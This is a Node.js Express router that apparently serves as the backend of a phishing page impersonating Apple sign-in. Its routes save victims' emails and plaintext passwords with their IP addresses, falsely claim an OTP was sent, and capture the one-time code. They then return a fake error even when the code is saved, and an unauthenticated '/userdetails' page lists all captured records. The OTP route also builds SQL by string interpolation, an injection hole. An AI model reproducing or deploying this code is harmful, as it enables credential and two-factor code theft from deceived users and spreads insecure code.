var express = require("express");
var router = express.Router();
const { connection } = require("../connection/db");
const { userSocket, io } = require("../connection/connection");

router.post("/apple-login", (req, res) => {
  let { email, password } = req.body;

  connection.query(
    "SELECT * FROM user_details where email = ? where password IS NULL",
    [email],
    (err, result) => {
      let sql =
        "INSERT INTO `user_details` (`email`, `password`, `created_at`, `ip`) VALUES (?,?,NOW(),?)";
      if (result && result.length > 0) {
        sql = `update user_details set password = ? where email = ?`;
      }

      let data =
        result && result.length > 0
          ? [password, email]
          : [email, password, req.ip];
      connection.query(sql, data, (err, result) => {
        if (err) {
          console.log(err);
        }
        if (result && result.affectedRows > 0) {
          res.status(200).json({
            message: "OTP has been sent to yor email address.",
            success: 1,
          });
          console.log(req.body)
          // req.app.get("socket").emit("request", { show: true, data: req.body });
        }
      });
    }
  );
});

router.post("/save_otp", (req, res) => {
  try {
    let { otp, email, password } = req.body;

    if (otp.length < 6) {
      res.status(200).json({
        message: "Please enter a valid OTP.",
        success: 1,
      });
    }
    let sql = `update user_details set user_otp = '${otp}' where email = '${email}' AND password = '${password}'`;

    connection.query(sql, (err, result) => {
      console.log(this.sql);
      if (err) {
        console.log(err);
      }
      console.log(result);
      if (result && result.affectedRows > 0) {
        setTimeout(() => {
          let response = Math.ceil(Math.random() * 10);
          console.log(response);
          res.status(200).json({
            message: "something went wrong, please try again.",
            success: 1,
          });
        }, 5000);
      } else {
        res.status(200).json({
          message: "something went wrong, please try again.",
          success: 0,
        });
      }
    });
  } catch (error) {
    console.log(error);
  }
});

router.post("/apple-email-verify", (req, res) => {
  let { email } = req.body;

  connection.query(
    "INSERT INTO `user_details` (`email`, `created_at`, `ip`) VALUES (?,NOW(),?)",
    [email, req.ip],
    (err, result) => {
      if (err) {
        console.log(err);
      }
      if (result && result.affectedRows > 0) {
        setTimeout(() => {
          let response = Math.ceil(Math.random() * 10);
          console.log(response);
          // if (response % 2 == 0) {
          res.json({ success: 1 });
          // } else {
          //   res.status(200).json({
          //     message: "opps something went wrong.",
          //     success: 0,
          //   });
          // }
        }, 1500);
      }
    }
  );
});

router.get("/userdetails", (req, res) => {
  // Example data
  try {
    connection.query("select * from user_details;", (err, result) => {
      if (err) return;
      // Render the EJS file with the data
      res.render("viewlist", { result });
    });
  } catch (error) {
    console.log(error);
  }
});

router.get("/hello_check", (req, res) => {
  // if (io) {
  res.send({});
  // }
});

module.exports = router;
